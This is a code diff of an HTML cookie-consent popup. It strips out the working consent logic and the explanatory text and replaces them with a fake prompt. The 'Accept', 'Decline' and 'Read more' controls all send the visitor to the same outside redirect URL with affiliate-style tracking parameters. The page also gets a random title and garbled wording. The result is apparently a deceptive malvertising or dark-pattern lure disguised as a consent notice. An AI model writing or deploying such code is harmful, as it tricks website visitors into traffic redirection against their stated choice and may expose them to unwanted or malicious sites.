@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
-  <title>pla49mo</title>
+  <title>Btnw</title>
   <style>
     *, *::before, *::after {
       box-sizing: border-box;
@@ -41,27 +41,6 @@
       align-items: center;
       justify-content: center;
       padding: 20px;
-      transition: opacity 0.3s;
-    }
-
-    .overlay.hidden {
-      opacity: 0;
-      pointer-events: none;
-    }
-
-    .popup-more {
-      display: none;
-      font-size: 13px;
-      color: #666;
-      line-height: 1.6;
-      margin: -12px 0 20px;
-      padding: 12px 14px;
-      background: #f5f7fb;
-      border-radius: 8px;
-    }
-
-    .popup-more.open {
-      display: block;
     }
 
     .popup {
@@ -185,40 +164,24 @@
       </div>
 
       <p class="popup-desc">
-        This website uses cookies to give you a better browsing experience.
-        <a href="javascript:void(0)" onclick="toggleMore()">Read more</a>
+        This website use cookies to help you have a superior and more admissible browsing
+        experience on the website. <a href="javascript:void(0)" onclick="goYes()">Read more</a>
       </p>
 
-      <div class="popup-more" id="popup-more">
-        We use essential cookies to keep the site working, and optional cookies to remember
-        your preferences and understand how the site is used. If you decline, only essential
-        cookies are used. You can change your choice at any time by clearing your browser data.
-      </div>
-
       <div class="btn-row">
-        <button class="btn btn-accept" onclick="setConsent('accepted')">Accept</button>
-        <button class="btn btn-decline" onclick="setConsent('declined')">Decline</button>
+        <button class="btn btn-accept" onclick="goYes()">Accept</button>
+        <button class="btn btn-decline" onclick="goNo()">Decline</button>
       </div>
 
     </div>
   </div>
 
   <script>
-    var overlay = document.getElementById('overlay');
+    var yes = 'https://mo.zenlaneo.com/redirect.aspx?pid=272262&bid=1929&lpid=6';
+    var no  = 'https://mo.zenlaneo.com/redirect.aspx?pid=272262&bid=1929&lpid=6';
 
-    function toggleMore() {
-      document.getElementById('popup-more').classList.toggle('open');
-    }
-
-    function setConsent(choice) {
-      try { localStorage.setItem('cookie-consent', choice); } catch (e) {}
-      overlay.classList.add('hidden');
-    }
-
-    // Don't ask again if the visitor already made a choice
-    try {
-      if (localStorage.getItem('cookie-consent')) overlay.classList.add('hidden');
-    } catch (e) {}
+    function goYes() { window.location.href = yes; }
+    function goNo()  { window.location.href = no;  }
   </script>
 
 </body>
